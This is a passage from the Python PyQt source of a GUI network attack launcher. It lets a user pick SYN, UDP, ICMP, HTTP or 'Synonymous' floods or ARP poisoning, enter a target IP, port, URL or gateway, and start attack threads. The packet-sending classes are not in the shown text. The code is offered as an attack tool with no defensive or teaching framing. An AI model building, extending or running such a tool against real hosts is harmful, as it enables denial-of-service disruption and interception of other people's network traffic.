            input_field = QLineEdit()
            self.fields[key] = label
            self.fields[key.replace("label", "input")] = input_field
            layout.addWidget(label)
            layout.addWidget(input_field)
            label.hide()
            input_field.hide()

    def update_fields(self):
        # Check if an attack is running
        if self.attack_running:
            # Revert the selection to the previous attack type
            QMessageBox.warning(self, "Stop the Attack", "You must stop the attack before changing the type.")
            self.attack_combo.blockSignals(True)  # Temporarily block signals to avoid triggering the event again
            current_index = self.attack_combo.findText(self.previous_attack_type)
            self.attack_combo.setCurrentIndex(current_index)
            self.attack_combo.blockSignals(False)  # Re-enable signals
            return

        # Clear the log widget
        self.log_widget.clear()

        # Clear all input fields
        for key, field in self.fields.items():
            if isinstance(field, QLineEdit):
                field.clear()

        # Hide all fields
        for key in self.fields:
            self.fields[key].hide()
            if key.endswith("input"):
                self.fields[key].hide()

        # Show fields relevant to the selected attack type
        attack_type = self.attack_combo.currentText()
        for key in self.attack_configs.get(attack_type, []):
            self.fields[key].show()
            self.fields[key.replace("label", "input")].show()

        # Update the previous attack type
        self.previous_attack_type = attack_type

    def start_attack(self):
        # Clear the log widget at the beginning of a new attack
        self.log_widget.clear()
        
        attack_type = self.attack_combo.currentText()
        params = {key: field.text() for key, field in self.fields.items() if isinstance(field, QLineEdit) and field.isVisible()}
        if any(value.strip() == "" for value in params.values()):
            QMessageBox.warning(self, "Missing Parameters", "Please fill in all required fields.")
            return

        if attack_type == "SYN Flood":
            target_ip = self.fields["ip_input"].text().strip()
            target_port = int(self.fields["port_input"].text().strip())
            packet_count = int(self.fields["packet_count_input"].text().strip())
            self.thread = SynFloodThread(target_ip, target_port, packet_count)
            self.thread.log_signal.connect(self.log_widget.append)
            self.thread.finished.connect(self.attack_finished)
            self.thread.start()

        elif attack_type == "UDP Flood":
            target_ip = self.fields["ip_input"].text().strip()
            target_port = int(self.fields["port_input"].text().strip())
            packet_count = int(self.fields["packet_count_input"].text().strip())
            self.thread = UdpFloodThread(target_ip, target_port, packet_count)
            self.thread.log_signal.connect(self.log_widget.append)
            self.thread.finished.connect(self.attack_finished)
            self.thread.start()

        elif attack_type == "ICMP Flood":
            target_ip = self.fields["ip_input"].text().strip()            
            packet_count = int(self.fields["packet_count_input"].text().strip())
            self.thread = IcmpFloodThread(target_ip, packet_count)
            self.thread.log_signal.connect(self.log_widget.append)
            self.thread.finished.connect(self.attack_finished)
            self.thread.start()
            
        elif attack_type == "HTTP Flood":
            target_url = self.fields["url_input"].text().strip()
            num_requests = int(self.fields["packet_count_input"].text().strip())
            self.thread = HttpFloodThread(target_url, num_requests)
            self.thread.log_signal.connect(self.log_widget.append)
            self.thread.finished.connect(self.attack_finished)
            self.thread.start()
        
        elif attack_type == "ARP Poisoning":
            target_ip = self.fields["ip_input"].text().strip()
            gateway_ip = self.fields["gateway_ip_input"].text().strip()
            self.thread = ArpPoisonThread(target_ip, gateway_ip)
            self.thread.log_signal.connect(self.log_widget.append)
            self.thread.finished.connect(self.attack_finished)
            self.thread.start()    
                
        elif attack_type == "Synonymous Flood":
            target_ip = self.fields["ip_input"].text().strip()
            target_port = int(self.fields["port_input"].text().strip())
            packet_count = int(self.fields["packet_count_input"].text().strip())
            self.thread = SynonymousFloodThread(target_ip, target_port, packet_count)
            self.thread.log_signal.connect(self.log_widget.append)
            self.thread.finished.connect(self.attack_finished)
            self.thread.start()

        self.start_button.setVisible(False)
        self.stop_button.setVisible(True)
        self.attack_running = True

    def attack_finished(self):
        self.start_button.setVisible(True)
        self.stop_button.setVisible(False)
        self.attack_running = False
        
    def stop_attack(self):
        if hasattr(self, "thread") and self.thread.isRunning():
            self.thread.stop()
            self.thread.wait()
        self.attack_finished()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())